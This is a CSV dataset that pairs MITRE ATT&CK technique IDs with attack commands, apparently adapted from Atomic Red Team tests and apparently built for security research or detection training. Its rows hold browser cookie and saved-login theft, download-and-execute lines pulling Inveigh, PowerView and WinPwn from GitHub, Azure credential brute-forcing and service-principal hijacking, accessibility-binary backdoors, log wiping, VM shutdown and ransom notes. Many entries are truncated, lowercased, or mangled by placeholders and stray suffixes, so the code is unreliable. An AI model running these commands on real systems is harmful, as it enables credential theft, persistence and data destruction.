mitre_id,command
T1539,"stop-process  -name  ""firefox""  -force  -erroraction  silentlycontinue  $cookiedblocation  =  get-childitem  -path  ""$env:appdata\mozilla\firefox\profiles\*\cookies.sqlite""  ""select  host,  name,  value,  path,  expiry,  issecure,  ishttponly,  samesite  from  [moz_cookies];""  |  cmd  \c  var_36467"""
T1555,"copy-item  ""$env:localappdata\google\chrome\user  data\default\login  data""  -destination  ""pathtoatomicsfolder\..\externalpayloads""  copy-item  ""$env:localappdata\google\chrome\user  data\default\login  data  for  account""  -destination  ""pathtoatomicsfolder\..\externalpayloads"""
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_791\extension\"" -passthru"
T1135,"import-module ""pathtoatomicsfolder\..\externalpayloads\powerview.ps1"" invoke-sharefinder var_42719"
T1489,sudo systemctl stop var_79182
T1553,xattr -d com.apple.quarantine var_750
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt# run_5465
T1217,"find \ -path ""*\.config\chromium\*\bookmarks"" -exec echo {} >> var_706 2>\dev\null"
T1486,echo  t1486  -  purelocker  ransom  note  >  %userprofile%\desktop\your_files.txt
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y# run_6739"
T1098,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential > $null $sp = get-azureadserviceprincipal -searchstring ""#{service_principal_name}"" | select-object -first 1 if ($sp -eq $null) { write-warning ""service principal not found""; exit } # in the context of an art test (and not a real attack), we don't need to keep access for too long. in case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long $crednotafter = (get-date).adddays(1) $certnotafter = (get-date).adddays(2) # certificate expiry must be later than cred expiry $cert = new-selfsignedcertificate -dnsname ""atomicredteam.example.com"" -friendlyname ""atomiccert"" -certstorelocation cert:\currentuser\my -keyexportpolicy exportable -provider ""microsoft enhanced rsa and aes cryptographic provider"" -notafter $certnotafter $keyvalue = [system.convert]::tobase64string($cert.getrawcertdata()) write-host ""generated certificate """"$($cert.thumbprint)"""""" new-azureadserviceprincipalkeycredential -objectid $sp.objectid -type asymmetricx509cert -customkeyidentifier ""atomictest"" -usage verify -value $keyvalue -enddate $crednotafter start-sleep -s 30 $tenant = get-azureadtenantdetail $auth = connect-azuread -tenantid $tenant.objectid -applicationid $sp.appid -certificatethumbprint $cert.thumbprint write-host ""application hijacking worked. logged in successfully as $($auth.account.id) of type $($auth.account.type)"" write-host ""end of hijacking"""
T1217,"$url_regex = '(htt(p|s)):\\([\w-]+\.)+[\w-]+(\[\w- .\?%&=]*)*?' $history = get-content -path ""var_46972"""
T1030,$file = [system.io.file]::openread(var_526 $file.close()
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_335"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1218,reg.exe add hklm\software\microsoft\provisioning\commands\lolbin\dummy1 /v altitude /t reg_dword /d 0 reg add hklm\software\microsoft\provisioning\commands\lolbin\dummy1\dummy2 /v commandline /d calc.exe c:\windows\system32\provlaunch.exe lolbin
T1140,"mkdir ""var_495"" -f:* . popd"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_82812 write-host ""end of golden saml"""
T1087,net user administrator /domain
T1110,"@for \f %n in (%temp%\users.txt) do @echo | set\p=. & @net use %logonserver%\ipc$ \user:""%userdomain%\%n"" ""var_470 && @net use \delete %logonserver%\ipc$ > nul"
T1222,"icacls ""#{path}"" /grant everyone:f /t /c /q"
T1563,"query  user  sc.exe  create  sesshijack  binpath=  ""cmd.exe  \k  tscon  var_29213""  net  start  sesshijack"
T1140,encoded=$(echo  'var_428  |  b64decode  -r
T1018,"""var_91930"
T1055,"$mypid = #{process_id} mavinject $mypid /injectrunning ""#{dll_payload}"" stop-process -processname notepad"
T1529,"echo """" | ""var_434'`; do vim-cmd vmsvc\power.off $i & done"""
T1087,ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/t1087
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_94975 write-host ""end of federation configuration."""
T1083,"$out  =  ""var_11283  #  write  results  $tr  |  out-file  -filepath  $out  -encoding  utf8  write-output  ""enumeration  complete.  results  written  to:  $out"""
T1547,"if( $(get-service -name spooler).starttype -eq ""disabled"") {set-service -name ""spooler"" -startuptype automatic} net stop spooler copy-item ""$pathtoatomicsfolder\t1547.012\bin\atomictest.dll"" %systemroot%\system32\spool\prtprocs\x64\atomictest.dll reg add ""hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam"" \v ""driver"" \d ""atomictest.dll"" \t reg_sz \f net start spooler if(var_329"
T1098,"$credfile  =  ""var_65806"
T1083,"cd $home && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > #{output_file} if [ -f /etc/mtab ]; then cat /etc/mtab >> #{output_file}; fi; find . -type f -iname *.pdf >> #{output_file} cat #{output_file} find . -type f -name "".*"""
T1020,"$filename = ""var_288"
T1127,"copy ""var_128 \t:library %temp%\libhello.js"
T1005,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""var_349 of notesfolder' -e 'repeat with afile in notesfiles' -e 'duplicate afile to folder destinationfolderpath with replacing' -e 'end' -e 'end tell'"
T1114,"$ss = convertto-securestring ""var_345"
T1137,"$excelapp  =  new-object  -comobject  ""excel.application""  if(-not  $excelapp.path.contains(""program  files  (x86)"")){  write-host  ""64-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x64.xll"")  }  else{  write-host  ""32-bit  office""  $excelapp.registerxll(""pathtoatomicsfolder\t1137.006\bin\addins\excelxll_x86.xll"")  }> /dev/null 2>&1 # id_97"
T1123,sh var_231
T1530,"$storage_account_objects = import-csv -path ""var_482"
T1572,var_14519 &
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_63842"""
T1070,cat /dev/null > #{history_path}
T1030,$file = [system.io.file]::openread(var_953 $file.close()
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_171"" net start sesshijack"
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_35589"
T1072,"""%programfiles(x86)%\var_248"""
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_29113 write-host ""end of federation configuration."""
T1112,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyenable /t reg_dword /d 1 /f"
T1569,psexec.py 'var_67904'
T1133,"$extlist = var_72374 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1550,"""var_441"""
T1007,net.exe  start  >>  var_54656
T1615,gpresult \z> /dev/null 2>&1 # id_14
T1030,$file = [system.io.file]::openread(var_176 $file.close()
T1124,net  time  \\var_53045  w32tm  \tz
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt# run_9022"
T1110,"import-module -name azuread $passwords = ""#{passwords}"".split(""{`n}"") foreach($password in $passwords) { $pword = convertto-securestring -string ""$password"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword try { write-host "" [-] attempting ${password} on account #{username}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] #{username}:${password} are valid credentials!`r`n"" break } catch { write-host "" [-] #{username}:${password} invalid credentials.`r`n"" } } write-host ""end of bruteforce""> /dev/null 2>&1 # id_17"
T1491,"echo """" | ""var_162"" ""esxcli system welcomemsg set -m 'ransomware-notification'"""
T1497,"if [ ""$(system_profiler sphardwaredatatype | grep ""model identifier"" | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;> /dev/null 2>&1 # id_77"
T1578,gcloud compute snapshots create var_826
T1571,echo  quit  |  telnet  var_525  exit  0
T1202,forfiles \p %systemroot%\system32 \m notepad.exe \c var_56702
T1112,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautoupdate"" /t reg_dword /d 1 /f"
T1609,"docker build -t t1609 $pathtoatomicsfolder\t1609\src\ docker run --name t1609_container --rm -itd t1609 bash \tmp\script.sh docker exec -i t1609_container bash -c ""cat \tmp\output.txt""# run_8923"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_367 write-host ""end of golden saml"""
T1548,sudo -l sudo cat /etc/sudoers sudo vim /etc/sudoers
T1098,gcloud config set project var_121.iam.gserviceaccount.com --quiet
T1556,"sudo sed -i """" ""var_811"
T1218,"infdefaultinstall.exe ""#{inf_to_execute}"""
T1547,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""common startup"" -value ""#{new_startup_folder}"""
T1113,import  -window  root  var_644
T1578,gcloud compute snapshots create var_834
T1609,kubectl create -f var_62143
T1546,if not exist %windir%\system32\osk.exe.bak (copy %windir%\system32\osk.exe %windir%\system32\osk.exe.bak) else ( pushd ) takeown \f %windir%\system32\osk.exe \a icacls %windir%\system32\osk.exe \grant administrators:f \t del %windir%\system32\osk.exe mklink %windir%\system32\osk.exe %windir%\system32\cmd.exe
T1039,"copy-item -path ""\\var_936"""
T1074,"invoke-webrequest ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.bat"" -outfile var_924"
T1202,forfiles \p %systemroot%\system32 \m notepad.exe \c var_14773
T1018,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe""  -f  (objectcategory=computer)  var_83531"
T1020,"$sampledata = ""sample data for exfiltration test"" set-content -path ""var_41166"" -credential $creds"
T1127,"copy ""var_177 %temp%\hello.js"
T1543,sc config var_59580
T1059,out-athpowershellcommandlineparameter  -commandlineswitchtype  var_96861  -execute  -erroraction  stop
T1021,evil-winrm -i #{destination_address} -u #{user_name} -p #{password}# run_1056
T1546,echo  'var_930'  >>  ~\.bashrc
T1550,"var_234"""
T1070,sudo srm #{system_log_path} #system log file deletion sudo srm -r #{system_log_folder} #recursive deletion of log files
T1530,"$storage_account_objects = import-csv -path ""var_79765"
T1137,reg.exe add hkcu\software\microsoft\office\var_68609 \f
T1496,yes > \dev\null# run_5152
T1124,net time \\var_47726 w32tm \tz
T1132,echo -n 111-11-1111 | base64 curl -xpost var_373
T1127,"copy ""var_75296 \t:library %temp%\libhello.js"
T1489,sudo kill -sigterm $(pgrep var_32145)
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat""# run_7505"
T1218,invoke-athcompiledhelp -infotechstoragehandler #{infotech_storage_handler} -hhfilepath #{hh_file_path} -chmfilepath #{chm_file_path}# run_1481
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_982"" net start sesshijack"
T1220,"""var_736"""
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_13293 -method post -body $cyphertext -disablekeepalive"
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domaintrust -verbose
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_298"
T1056,"cp -v \etc\pam.d\sshd \tmp\ echo ""session required pam_tty_audit.so disable=* enable=* open_only log_passwd"" >> \etc\pam.d\sshd systemctl restart sshd systemctl restart auditd ssh var_88964@localhost whoami sudo su whoami exit exit"
T1123,sh var_27092
T1070,"echo """" > #{history_path}"
T1018,arp  -a> /dev/null 2>&1 # id_54
T1543,if [ ! -d ~/library/launchagents ]; then mkdir ~/library/launchagents; fi; sudo cp #{path_malicious_plist} ~/library/launchagents/#{plist_filename} sudo launchctl load -w ~/library/launchagents/#{plist_filename}
T1571,echo quit | telnet var_371 exit 0
T1491,"$notepath = join-path $env:temp ""var_482"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
T1609,kubectl create -f var_973
T1562,net.exe stop #{service_name} sc.exe config #{service_name} start= disabled
T1140,encoded=$(echo 'var_37406 | xxd -r -p
T1071,"set-location ""pathtoatomicsfolder"" .\t1071.004\src\t1071-dns-beacon.ps1 -domain var_263"
T1654,powershell  -c  {get-eventlog  'security'  |  where  {$_.message  -like  '*system*'}  |  export-csv  $env:temp\t1654_events.txt}> /dev/null 2>&1 # id_22
T1489,sudo  killall  -sigterm  var_634
T1137,"$wdapp = new-object -comobject ""word.application"" if(-not $wdapp.path.contains(""program files (x86)"")) { write-host ""64-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x64.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } else{ write-host ""32-bit office"" copy ""pathtoatomicsfolder\t1137.006\bin\addins\wordwll_x86.wll"" ""$env:appdata\microsoft\word\startup\notepad.wll"" } stop-process -name ""winword"" start-process ""winword"""
T1219,start-process var_618
T1136,useradd -g 0 -m -d \root -s \bin\bash var_44528; fi;
T1027,dd if=\dev\zero bs=1 count=1 >> var_94593 #adds low-quality random data
T1222,fsutil behavior set symlinkevaluation r2l:1 fsutil behavior set symlinkevaluation r2r:1
T1652,driverquery \v \fo list driverquery \si \fo list
T1140,copy  %windir%\system32\certutil.exe  %temp%\tcm.tmp  %temp%\tcm.tmp  -encode  var_48193  %temp%\t1140_calc2.txt  %temp%\tcm.tmp  -decode  %temp%\t1140_calc2.txt  %temp%\t1140_calc2_decoded.exe
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }# run_6084"
T1529,shutdown  \s  \t  var_68548
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_62762"
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive> /dev/null 2>&1 # id_65
T1550,"""var_63885"""
T1573,$server_ip  =  var_323
T1543,sudo cp #{script_location} #{script_destination} sudo touch /private/var/db/emondclients/#{empty_file}
T1003,mkdir c:\exfil diskshadow.exe /s #{filename}
T1047,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""var_410"
T1124,date> /dev/null 2>&1 # id_49
T1033,"cmd.exe \c whoami wmic useraccount get \all quser \server:""var_992 ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > computers.txt @for \f %n in (computers.txt) do @for \f ""tokens=1,2"" %i in ('qwinsta \server:%n ^| findstr ""active disc""') do @echo %i | find \v ""#"" | find \v ""console"" || echo %j > usernames.txt"
